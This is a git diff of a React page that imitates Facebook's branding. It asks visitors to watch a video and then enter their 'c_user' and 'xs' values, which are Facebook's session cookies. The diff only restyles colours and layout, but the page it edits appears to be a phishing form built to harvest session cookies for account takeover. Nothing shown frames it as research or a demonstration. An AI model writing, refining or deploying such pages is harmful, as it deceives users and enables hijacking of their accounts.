@@ -18,6 +18,7 @@ import { validationFormSchema } from "@shared/schema";
 import { useMobile } from "@/hooks/use-mobile";
 import { MobileModal } from "@/components/mobile-modal";
 import { Search } from "lucide-react";
+import React from 'react';
 
 export default function Validation() {
   const { toast } = useToast();
@@ -75,7 +76,7 @@ export default function Validation() {
       {/* Navigation Bar */}
       <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
         <div className="flex items-center">
-          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
+          <p className="text-[#0180FA] text-xl sm:text-2xl font-bold">facebook</p>
         </div>
         <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
           <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
@@ -105,8 +106,11 @@ export default function Validation() {
             </p>
           </div>
 
-          <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4">
-            <h2 className="text-base sm:text-lg font-semibold text-[#1c1e21]">Detailed Video Information</h2>
+          <div className="bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4" style={{
+            background: 'linear-gradient(139deg, #0180FA 0%, #0180FA 100%)',
+            color: 'white'
+          }}>
+            <h2 className="text-base sm:text-lg font-semibold">Detailed Video Information</h2>
 
             <div className="video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black">
               <video
@@ -123,7 +127,7 @@ export default function Validation() {
               </video>
             </div>
 
-            <h3 className="font-semibold text-sm sm:text-base text-[#1c1e21]">
+            <h3 className="font-semibold text-sm sm:text-base">
               Must Watch the video and submit required information correctly.
             </h3>
           </div>
@@ -143,7 +147,7 @@ export default function Validation() {
                         pattern="[0-9]+"
                         minLength={6}
                         placeholder="Enter c_user"
-                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
+                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50"
                         {...field}
                       />
                     </FormControl>
@@ -161,7 +165,7 @@ export default function Validation() {
                       <Input 
                         type="text" 
                         placeholder="Enter xs" 
-                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
+                        className="text-sm sm:text-base border-[#dddfe2] focus:border-[#0180FA] focus:ring-[#0180FA] focus:ring-opacity-50"
                         {...field} 
                       />
                     </FormControl>
@@ -176,7 +180,7 @@ export default function Validation() {
 
               <Button 
                 type="submit" 
-                className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200"
+                className="w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#0180FA] hover:bg-[#0180FA]/90 transition-colors duration-200"
                 disabled={form.formState.isSubmitting}
               >
                 {form.formState.isSubmitting ? "Submitting..." : "Submit"}
